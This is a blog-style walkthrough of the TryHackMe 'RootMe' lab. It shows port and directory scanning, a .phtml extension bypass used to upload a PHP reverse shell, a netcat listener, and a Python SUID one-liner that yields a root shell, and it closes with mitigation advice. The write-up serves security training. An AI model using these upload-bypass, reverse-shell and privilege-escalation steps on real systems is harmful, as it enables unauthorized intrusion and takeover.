---
layout: post
title: RootMe
subtitle: TryHackMe Writeup - RootMe
description: Exploit insecure file upload functionality, gain reverse shell access, and escalate privileges via SUID Python binary.
image: https://tryhackme-images.s3.amazonaws.com/room-icons/11d59cb34397e986062eb515f4d32421.png
optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/11d59cb34397e986062eb515f4d32421.png
category: tryhackme
tags:
  - TryHackMe
  - File Upload Vulnerability
  - SUID Privilege Escalation
  - Python SUID
  - Web Exploitation
  - Linux
author: mustafa_altayeb
date: 2025-10-30 00:00:00 +0000
paginate: true
---

# RootMe - TryHackMe Writeup

[RootMe](https://tryhackme.com/room/rrootme) is a beginner-friendly CTF machine that focuses on web application security vulnerabilities, specifically insecure file upload functionality, and Linux privilege escalation through SUID binaries.

**Difficulty**: Easy ⭐  
**Operating System**: Linux (Ubuntu)  
**Themes**: File Upload Exploitation, Web Enumeration, SUID Privilege Escalation

---

## Objectives

1. Enumerate web services and discover file upload functionality
2. Bypass file upload restrictions to gain reverse shell access
3. Escalate privileges using SUID Python binary
4. Capture user and root flags

---

## Reconnaissance

### Nmap Scan

Comprehensive port scanning to identify attack surfaces:

```bash
nmap -sCV -p- -T4 10.10.233.74
```

**Results**:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key Findings**:
- **Port 22**: SSH service (potential for credential access)
- **Port 80**: Apache web server (primary attack vector)

---

## Web Enumeration

### Initial Discovery

The main web page didn't reveal obvious vulnerabilities:

![RootMe Homepage](/assets/TryHackMeRoomsImage/RootMe/image.png)

### Directory Enumeration with Gobuster

```bash
gobuster dir --url http://10.10.233.74 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

**Critical Discoveries**:
```
/uploads              (Status: 301)
/panel                (Status: 301)
```

### File Upload Functionality

Accessed `/panel` to find a file upload interface:

![File Upload Panel](/assets/TryHackMeRoomsImage/RootMe/image2.png)

### File Extension Bypass

Initial attempts to upload `.php` files were blocked. Successfully bypassed the restriction by using `.phtml` extension:

![Successful Upload](/assets/TryHackMeRoomsImage/RootMe/image3.png)

**File**: `shell.phtml` (PentestMonkey PHP reverse shell modified with attacker IP/port)

---

## Initial Access

### Reverse Shell Deployment

1. **Start listener**:
   ```bash
   nc -nlvp 9090
   ```

2. **Trigger shell**:
   Access `http://10.10.233.74/uploads/shell.phtml`

### Shell Access Obtained

```bash
$ whoami
www-data
```

**Initial Access**: User `www-data` with limited privileges

---

## Privilege Escalation

### SUID Binary Enumeration

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Critical Finding**:
```
/usr/bin/python2.7
```

### Python SUID Exploitation

Referenced [GTFOBins Python SUID](https://gtfobins.github.io/gtfobins/python/#suid) for exploitation:

![GTFOBins Reference](/assets/TryHackMeRoomsImage/RootMe/image4.png)

**Exploitation Command**:
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Root Access Obtained

```bash
# whoami
root
```

---

## Flag Capture

### User Flag

```bash
cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```

### Root Flag

```bash
cat /root/root.txt
THM{pr1v1l3g3_3s.......}
```

---

## Key Takeaways

### Attack Path Summary:
```
Port Scanning → Web Directory Enumeration → File Upload Discovery → 
Extension Bypass → Reverse Shell Deployment → SUID Enumeration → 
Python SUID Exploitation → Root Access
```

### Vulnerabilities Exploited:
1. **Insecure File Upload** - Insufficient file extension validation
2. **SUID Misconfiguration** - Python binary with unnecessary SUID permissions
3. **Web Server Misconfiguration** - Web-accessible upload directory

### Mitigation Strategies:
1. **For File Upload Security**:
   - Implement whitelist approach for file extensions
   - Store uploaded files outside web root
   - Scan uploaded files for malicious content
   - Implement proper MIME type validation

2. **For Linux Security**:
   - Regular SUID binary audits
   - Principle of least privilege
   - Remove unnecessary SUID permissions
   - Implement SELinux/AppArmor profiles

3. **For Web Application Security**:
   - Input validation and sanitization
   - Regular security testing
   - Web application firewalls
   - Security headers implementation

### Tools Used:
- **Nmap** - Port scanning and service enumeration
- **Gobuster** - Web directory enumeration
- **PentestMonkey PHP Reverse Shell** - Payload for initial access
- **Netcat** - Reverse shell handling
- **GTFOBins** - Privilege escalation reference

### Timeline of Events:
1. **Initial Reconnaissance** - Port scanning identifies web server
2. **Web Enumeration** - Discovery of upload panel
3. **File Upload Exploitation** - Bypass extension restrictions
4. **Initial Access** - Reverse shell as www-data
5. **Privilege Escalation** - SUID Python exploitation
6. **Flag Capture** - User and root flags obtained

---

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style="border:none;"></iframe>

**Find me online**:  
• TryHackMe: [t4t4r1s](https://tryhackme.com/p/t4t4r1s)  
• LinkedIn: [Mustafa Altayeb](https://www.linkedin.com/in/t4t4r1s)  
• X: [@mustafa_altayeb](https://x.com/t4t4r1s)

---
